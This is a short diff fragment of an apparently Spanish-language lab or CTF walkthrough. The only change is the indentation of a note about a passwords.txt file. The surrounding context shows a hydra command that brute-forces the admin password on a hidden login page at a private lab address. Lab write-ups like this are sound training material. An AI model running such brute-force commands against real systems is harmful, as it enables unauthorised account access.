@@ -45,7 +45,7 @@ Al dirigirnos a http://172.17.69.241:8081/mySuperSecretHiddenLogin.php nos encon
     ```
     hydra -l admin -P /home/kali/Desktop/passwords.txt -u -s 8081 172.17.69.241 http-post-form "/mySuperSecretHiddenLogin.php:username=admin&password=^PASS^:Error"
     ```
-* _passwords.txt es un archivo de claves que tenemos en el escritorio de kali_
+	* _passwords.txt es un archivo de claves que tenemos en el escritorio de kali_
 
 1. Finalmente, hydra nos arroja las credenciales
 
